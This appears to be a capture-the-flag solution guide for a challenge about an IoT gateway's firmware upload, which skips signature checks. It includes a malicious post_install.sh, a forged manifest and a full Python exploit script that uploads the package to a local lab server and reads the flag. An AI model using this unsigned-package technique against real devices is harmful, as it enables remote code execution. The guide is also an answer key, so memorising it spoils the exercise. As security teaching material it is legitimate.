# A08 Medium: Solution Guide

### Vulnerability Analysis
1. Browse to `/settings/logs` and `/settings/firmware` to discover:
   - Hardware Controller Model: `VortexEdge-GW01`
   - Active Firmware: `v3.1.4`
   - Firmware Manifest Policy: Package must contain `firmware.json` specifying `target_model`, higher `version`, `entrypoint`, and `checksum_sha256`.
   - Security Flaw: Root cryptographic CA signature verification is omitted in local maintenance mode.
2. The server untars the package, validates that `firmware.json` matches the hardware and script checksum, and executes `post_install.sh` with the environment flag available.

---

### Exploitation Steps
1. Create a malicious `post_install.sh` script:
   ```bash
   #!/bin/bash
   cat /flag.txt 2>/dev/null || cat flag.txt
   ```
2. Compute the SHA-256 hash of `post_install.sh`.
3. Create a `firmware.json` manifest:
   ```json
   {
     "target_model": "VortexEdge-GW01",
     "version": "v3.2.0",
     "entrypoint": "post_install.sh",
     "checksum_sha256": "<COMPUTED_SHA256>"
   }
   ```
4. Compress both files into a tarball `package.tar.gz`.
5. Send a POST request to `/api/v1/staging/upload` (or submit via the Web UI at `/settings/firmware`).
6. Extract the dynamic flag from the response output.

---

### Exploit Script
```python
import io
import json
import hashlib
import tarfile
import requests
import re

BASE_URL = "http://127.0.0.1:6023"
session = requests.Session()

# 1. Script content
script_bytes = b"#!/bin/bash\ncat /flag.txt 2>/dev/null || cat flag.txt\n"
script_hash = hashlib.sha256(script_bytes).hexdigest()

# 2. Manifest content
manifest = {
    "target_model": "VortexEdge-GW01",
    "version": "v3.2.0",
    "entrypoint": "post_install.sh",
    "checksum_sha256": script_hash
}
manifest_bytes = json.dumps(manifest).encode('utf-8')

# 3. Build In-Memory Tarball
tar_stream = io.BytesIO()
with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
    # Add firmware.json
    m_info = tarfile.TarInfo(name="firmware.json")
    m_info.size = len(manifest_bytes)
    m_info.mode = 0o644
    tar.addfile(m_info, io.BytesIO(manifest_bytes))

    # Add post_install.sh
    s_info = tarfile.TarInfo(name="post_install.sh")
    s_info.size = len(script_bytes)
    s_info.mode = 0o755
    tar.addfile(s_info, io.BytesIO(script_bytes))

tar_stream.seek(0)

# 4. Upload and Deploy Package
resp = session.post(f"{BASE_URL}/api/v1/staging/upload", files={
    "firmware_file": ("package.tar.gz", tar_stream.getvalue(), "application/gzip")
}, allow_redirects=True)

# 5. Extract Flag
flag = re.search(r"RTSA\{[^}]+\}", resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
